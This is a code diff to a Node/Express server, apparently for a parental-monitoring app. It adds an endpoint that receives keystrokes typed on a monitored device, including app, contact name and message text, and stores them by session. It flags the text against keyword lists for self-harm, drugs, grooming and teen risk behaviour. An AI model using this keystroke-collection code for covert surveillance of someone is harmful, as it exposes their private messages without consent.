@@ -199,6 +199,167 @@ app.post('/api/sync/browser-history', async (req, res) => {
   }
 });
 
+// Risk keywords for keystroke analysis
+const RISK_KEYWORDS = {
+  HIGH: [
+    'suicide', 'kill myself', 'end my life', 'want to die', 'cutting', 'self harm',
+    'drugs', 'overdose', 'cocaine', 'heroin', 'meth', 'dealer',
+    'nude', 'naked', 'send pics', 'your body', 'meet up alone', 'dont tell anyone',
+    'gun', 'weapon', 'knife', 'hurt someone'
+  ],
+  MEDIUM: [
+    'bully', 'hate you', 'kill', 'fight', 'hurt', 'stupid', 'ugly',
+    'alcohol', 'beer', 'drunk', 'wasted', 'high', 'smoke', 'vape',
+    'sneak out', 'skip school', 'fake id', 'lie to parents',
+    'depressed', 'anxious', 'scared', 'alone', 'nobody likes me'
+  ]
+};
+
+// Analyze text for risk indicators
+function analyzeRisk(text) {
+  const lowerText = text.toLowerCase();
+  const flaggedKeywords = [];
+  
+  for (const keyword of RISK_KEYWORDS.HIGH) {
+    if (lowerText.includes(keyword.toLowerCase())) {
+      flaggedKeywords.push(keyword);
+    }
+  }
+  if (flaggedKeywords.length > 0) {
+    return { riskLevel: 'HIGH', flaggedKeywords, sentiment: 'Negative' };
+  }
+  
+  for (const keyword of RISK_KEYWORDS.MEDIUM) {
+    if (lowerText.includes(keyword.toLowerCase())) {
+      flaggedKeywords.push(keyword);
+    }
+  }
+  if (flaggedKeywords.length > 0) {
+    return { riskLevel: 'MEDIUM', flaggedKeywords, sentiment: 'Negative' };
+  }
+  
+  const positiveWords = ['love', 'happy', 'great', 'awesome', 'thanks', 'good', 'fun', 'excited'];
+  const negativeWords = ['sad', 'angry', 'mad', 'upset', 'bad', 'hate', 'worried'];
+  
+  let positiveCount = 0;
+  let negativeCount = 0;
+  
+  for (const word of positiveWords) {
+    if (lowerText.includes(word)) positiveCount++;
+  }
+  for (const word of negativeWords) {
+    if (lowerText.includes(word)) negativeCount++;
+  }
+  
+  const sentiment = positiveCount > negativeCount ? 'Positive' : 
+                   negativeCount > positiveCount ? 'Negative' : 'Neutral';
+  
+  return { riskLevel: 'LOW', flaggedKeywords: [], sentiment };
+}
+
+// Direct keystroke sync route (MUST be before syncRoutes to take precedence)
+app.post('/api/sync/keystrokes', async (req, res) => {
+  try {
+    const { deviceId, keystrokes } = req.body;
+    
+    if (!deviceId || !keystrokes || !Array.isArray(keystrokes)) {
+      console.log('[Keystrokes] Invalid request:', { deviceId: !!deviceId, keystrokes: Array.isArray(keystrokes) });
+      return res.status(400).json({ error: 'deviceId and keystrokes array required' });
+    }
+    
+    console.log(`[Keystrokes] Received ${keystrokes.length} keystrokes from device ${deviceId.substring(0, 8)}...`);
+    
+    // Verify device exists
+    const device = await Device.findOne({ deviceId: deviceId });
+    if (!device) {
+      console.log(`[Keystrokes] Device not found: ${deviceId}`);
+      return res.status(404).json({ error: 'Device not found' });
+    }
+    
+    // Group keystrokes by sessionId
+    const sessionMap = new Map();
+    
+    for (const keystroke of keystrokes) {
+      const { sessionId, timestamp, packageName, appName, contactName, textContent, fieldType } = keystroke;
+      
+      if (!sessionId || !textContent) continue;
+      
+      if (!sessionMap.has(sessionId)) {
+        sessionMap.set(sessionId, {
+          deviceId: device.deviceId,
+          sessionId,
+          appPackage: packageName,
+          appName: appName || packageName,
+          contactName: contactName || 'Unknown',
+          messages: [],
+          firstMessageTime: new Date(timestamp),
+          lastMessageTime: new Date(timestamp)
+        });
+      }
+      
+      const session = sessionMap.get(sessionId);
+      session.messages.push({
+        timestamp: new Date(timestamp),
+        text: textContent,
+        fieldType: fieldType || 'text'
+      });
+      
+      const msgTime = new Date(timestamp);
+      if (msgTime < session.firstMessageTime) session.firstMessageTime = msgTime;
+      if (msgTime > session.lastMessageTime) session.lastMessageTime = msgTime;
+    }
+    
+    // Process and save/update sessions
+    let savedCount = 0;
+    const KeystrokeSession = require('./models').KeystrokeSession;
+    
+    for (const [sessionId, sessionData] of sessionMap) {
+      try {
+        const allText = sessionData.messages.map(m => m.text).join(' ');
+        const { riskLevel, flaggedKeywords, sentiment } = analyzeRisk(allText);
+        
+        const existingSession = await KeystrokeSession.findOne({ sessionId });
+        
+        if (existingSession) {
+          existingSession.messages.push(...sessionData.messages);
+          existingSession.messageCount = existingSession.messages.length;
+          existingSession.lastMessageTime = sessionData.lastMessageTime;
+          
+          const combinedText = existingSession.messages.map(m => m.text).join(' ');
+          const analysis = analyzeRisk(combinedText);
+          existingSession.riskLevel = analysis.riskLevel;
+          existingSession.flaggedKeywords = analysis.flaggedKeywords;
+          existingSession.sentiment = analysis.sentiment;
+          
+          await existingSession.save();
+        } else {
+          await KeystrokeSession.create({
+            ...sessionData,
+            messageCount: sessionData.messages.length,
+            riskLevel,
+            flaggedKeywords,
+            sentiment
+          });
+        }
+        savedCount++;
+      } catch (err) {
+        console.error(`[Keystrokes] Error saving session ${sessionId}:`, err.message);
+      }
+    }
+    
+    console.log(`[Keystrokes] Device ${device.name} - Saved ${savedCount} sessions`);
+    
+    res.json({
+      success: true,
+      sessionsProcessed: savedCount,
+      keystrokesReceived: keystrokes.length
+    });
+  } catch (error) {
+    console.error('[Keystrokes] Error:', error);
+    res.status(500).json({ error: 'Failed to sync keystrokes', success: false });
+  }
+});
+
 // Routes
 app.use('/api/auth', authRoutes);
 app.use('/api/devices', deviceRoutes);
